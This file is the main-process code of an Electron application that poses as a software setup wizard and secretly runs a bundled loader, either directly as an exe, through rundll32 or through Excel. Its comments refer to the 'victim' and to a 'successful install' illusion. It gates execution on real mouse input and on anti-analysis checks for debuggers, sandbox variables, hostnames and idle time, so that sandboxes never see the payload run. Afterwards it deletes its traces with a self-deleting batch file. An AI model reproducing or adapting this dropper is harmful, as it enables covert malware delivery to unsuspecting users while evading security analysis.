const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { spawn } = require('child_process');
const config = require('./config');
const { runGuardrails } = require('./guardrails');

// Per-process interaction token. The renderer receives this ONCE, on first
// genuine mouse movement over the wizard window, via the 'installer:ready'
// IPC. The 'installer:run' handler then requires the token to match before
// doing ANY file I/O or spawning - this enforces that a sandbox which
// auto-invokes IPC handlers cannot bypass the user-interaction gate even
// if it skips the renderer entirely.
const INTERACTION_TOKEN = crypto.randomBytes(32).toString('hex');
let interactionTokenIssued = false;

// ---------------------------------------------------------------------------
// Out-of-process cleanup watcher
// ---------------------------------------------------------------------------
// The Electron main process exits as soon as the wizard window closes
// (window-all-closed -> app.quit), typically seconds after the loader is
// spawned. Any 'child.on("exit", ...)' handler dies with the main process, so
// we can't rely on in-process cleanup. Instead, after the loader is spawned
// we write a tiny self-deleting batch file to %TEMP%, launch it detached, and
// let it outlive Electron. The batch file polls tasklist for the loader PID,
// waits for it to exit, then rm-rf's the inst-<uuid> tree and deletes itself.
// This also dodges the Windows file-lock problem where a running PE can't be
// deleted by its own parent.
function scheduleOutOfProcessCleanup(childPid, tmpDir) {
  try {
    const cleanupBat = path.join(os.tmpdir(), `inst-clean-${crypto.randomUUID()}.bat`);
    // The `(goto) 2>nul & del "%~f0"` idiom is the canonical self-deleting
    // batch-file trick: cmd.exe commits to the current line before executing
    // it, so the `del` of the script file itself succeeds even though it's
    // the currently-running script.
    const script = [
      '@echo off',
      'setlocal',
      'set "LOADER_PID=%~1"',
      'set "TARGET_DIR=%~2"',
      ':wait',
      'tasklist /fi "pid eq %LOADER_PID%" 2>nul | findstr /b /l "%LOADER_PID%" >nul 2>&1',
      'if errorlevel 1 goto gone',
      'ping -n 2 127.0.0.1 >nul 2>&1',
      'goto wait',
      ':gone',
      'ping -n 2 127.0.0.1 >nul 2>&1',
      'rd /s /q "%TARGET_DIR%" 2>nul',
      'if exist "%TARGET_DIR%" (',
      '  ping -n 6 127.0.0.1 >nul 2>&1',
      '  rd /s /q "%TARGET_DIR%" 2>nul',
      ')',
      'endlocal',
      '(goto) 2>nul & del "%~f0"',
      '',
    ].join('\r\n');
    fs.writeFileSync(cleanupBat, script, { encoding: 'ascii' });

    // Detach the cleanup bat so it outlives the Electron main process.
    const watcher = spawn(
      'cmd.exe',
      ['/c', cleanupBat, String(childPid), tmpDir],
      {
        detached: true,
        windowsHide: true,
        stdio: 'ignore',
      },
    );
    watcher.unref();
  } catch (_) {
    // Best-effort cleanup — if the watcher spawn fails, the tmpDir will
    // persist until the victim reboots or clears %TEMP% manually. We
    // deliberately do not surface an error to the renderer because the
    // loader has already spawned and any user-visible failure here would
    // defeat the "successful install" UX illusion.
  }
}

function createWindow() {
  const win = new BrowserWindow({
    width: 560,
    height: 420,
    resizable: false,
    title: `${config.PRODUCT} Setup`,
    autoHideMenuBar: true,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: false,
    },
  });
  win.removeMenu();
  win.loadFile(path.join(__dirname, 'renderer', 'index.html'));
}

ipcMain.handle('installer:product', () => ({
  product: config.PRODUCT,
  publisher: config.PUBLISHER,
  version: config.VERSION,
  // Expose guardrail knobs the renderer needs to enforce on its side.
  dwellMs: (config.GUARDRAILS && config.GUARDRAILS.dwellMs) || 0,
  requireMouseMovement: !!(config.GUARDRAILS && config.GUARDRAILS.requireMouseMovement),
}));

// Called by the renderer the first time it observes a real user-input event
// (mousemove, click, or keypress) inside the wizard window AND the
// configured dwell time has elapsed. The renderer is untrusted - this
// handler only hands out the interaction token once, so even a renderer
// that forges the event sequence can't reuse the token.
ipcMain.handle('installer:ready', () => {
  if (interactionTokenIssued) return { token: null };
  interactionTokenIssued = true;
  return { token: INTERACTION_TOKEN };
});

ipcMain.handle('installer:run', async (_event, providedToken) => {
  try {
    // -------------------------------------------------------------------
    // Guardrail gate #1: interaction token.
    // The renderer must have obtained this via installer:ready, which is
    // only handed out after dwell-time + real user input. A sandbox that
    // invokes installer:run directly without going through the UI fails
    // this check and nothing is staged.
    // -------------------------------------------------------------------
    if (!interactionTokenIssued || providedToken !== INTERACTION_TOKEN) {
      return { ok: false, error: 'no-interaction' };
    }

    // -------------------------------------------------------------------
    // Guardrail gate #2: environment checks (debugger, sandbox vars,
    // hostname/username lists, screen size, idle time, anti-analysis
    // sleeps). These run BEFORE any file copy or spawn.
    // -------------------------------------------------------------------
    const gr = await runGuardrails(config.GUARDRAILS);
    if (!gr.ok) {
      return { ok: false, error: `guardrail:${gr.reason}` };
    }

    // -------------------------------------------------------------------
    // Only NOW do we touch the filesystem. The loader tree sits in
    // process.resourcesPath/payload/ (staged by electron-builder's
    // extraResources directive) - copy it to a fresh %TEMP%\inst-<uuid>
    // so the child process has a writable cwd and so cleanup is clean.
    // -------------------------------------------------------------------
    const srcDir = path.join(process.resourcesPath, 'payload');
    const tmpDir = path.join(os.tmpdir(), 'inst-' + crypto.randomUUID());
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.cpSync(srcDir, tmpDir, { recursive: true });

    const entryPath = path.join(tmpDir, config.ENTRY_NAME);
    let child;
    switch (config.ENTRY_FORMAT) {
      case 'exe':
        child = spawn(entryPath, [], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      case 'dll':
        child = spawn('rundll32.exe', [`${entryPath},${config.DLL_ENTRY}`], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      case 'xll':
        child = spawn('excel.exe', ['/e', entryPath], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      default:
        return { ok: false, error: `unsupported ENTRY_FORMAT: ${config.ENTRY_FORMAT}` };
    }

    // Hand cleanup off to an out-of-process watcher that polls tasklist
    // for the loader PID and rm-rf's tmpDir after the loader exits. This
    // survives the Electron main process quitting (which happens seconds
    // after the fake wizard advances to Finish) and also dodges the
    // Windows file-lock issue on the running loader exe.
    scheduleOutOfProcessCleanup(child.pid, tmpDir);
    child.unref();

    return { ok: true };
  } catch (err) {
    return { ok: false, error: String(err && err.message || err) };
  }
});

app.whenReady().then(createWindow);
app.on('window-all-closed', () => app.quit());
